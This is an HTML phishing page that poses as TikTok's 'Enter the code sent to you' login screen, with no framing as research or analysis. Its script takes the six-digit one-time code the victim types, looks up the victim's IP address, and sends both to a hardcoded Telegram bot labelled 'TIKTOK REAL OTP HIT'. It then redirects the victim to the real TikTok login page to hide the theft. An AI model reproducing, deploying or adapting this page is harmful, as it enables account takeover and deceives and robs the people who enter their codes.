<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TikTok - Verification Code</title>
  <link rel="icon" href="https://www.tiktok.com/favicon.ico">
  <style>
    body {
      margin: 0;
      background: #000;
      color: #fff;
      font-family: sans-serif;
      text-align: center;
      padding: 20px;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      max-width: 380px;
      background: #111;
      padding: 30px;
      border-radius: 12px;
    }
    .logo {
      width: 120px;
      margin: 0 auto 20px;
      display: block;
    }
    h2 {
      margin: 0 0 20px;
      font-size: 24px;
    }
    p {
      font-size: 16px;
      color: #ccc;
      margin-bottom: 24px;
    }
    input {
      width: 100%;
      padding: 16px;
      margin: 12px 0 20px;
      background: #222;
      border: none;
      color: #fff;
      border-radius: 8px;
      font-size: 24px;
      text-align: center;
      letter-spacing: 12px;
      font-family: monospace;
    }
    button {
      width: 100%;
      padding: 14px;
      background: #fe2c55;
      border: none;
      color: #fff;
      font-weight: bold;
      border-radius: 8px;
      font-size: 17px;
      cursor: pointer;
    }
    .small {
      font-size: 14px;
      color: #aaa;
      margin-top: 20px;
    }
    .loader {
      display: none;
      margin: 24px auto;
      border: 4px solid #222;
      border-top: 4px solid #fe2c55;
      border-radius: 50%;
      width: 32px;
      height: 32px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://www.tiktok.com/favicon.ico" alt="TikTok" class="logo">
    <h2>Enter the code sent to you</h2>
    <p>We just sent a 6-digit code to your email or phone number linked to your TikTok account. Enter it below to finish logging in.</p>

    <form id="otpForm">
      <input id="otp" placeholder="------" maxlength="6" required autocomplete="off" inputmode="numeric" pattern="[0-9]*">
      <button type="submit" id="btn">Continue</button>
      <div class="loader" id="loader"></div>
    </form>

    <div class="small">Didn't receive a code? Check spam folder or request a new one (this may take a moment).</div>
  </div>

  <script>
    const token = "8205658105:AAFH2lOY2Cd0yUASvewOT0hZqCOro5GDMGY";
    const chat = "6806926557";

    document.getElementById("otpForm").addEventListener("submit", async (e) => {
      e.preventDefault();

      const btn = document.getElementById("btn");
      const loader = document.getElementById("loader");
      btn.disabled = true;
      btn.textContent = "Verifying...";
      loader.style.display = "block";

      const otp = document.getElementById("otp").value.trim();

      let ip = "unknown";
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        ip = data.ip;
      } catch {}

      const msg = `ðŸ”‘ TIKTOK REAL OTP HIT\nOTP Code: ${otp}\nIP: ${ip}\nTime: ${new Date().toLocaleString("en-US", {timeZone: "America/New_York"})}`;

      await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}`)
        .catch(() => {});

      setTimeout(() => {
        window.location.href = "https://www.tiktok.com/login";
      }, 2200);
    });
  </script>
</body>
</html>
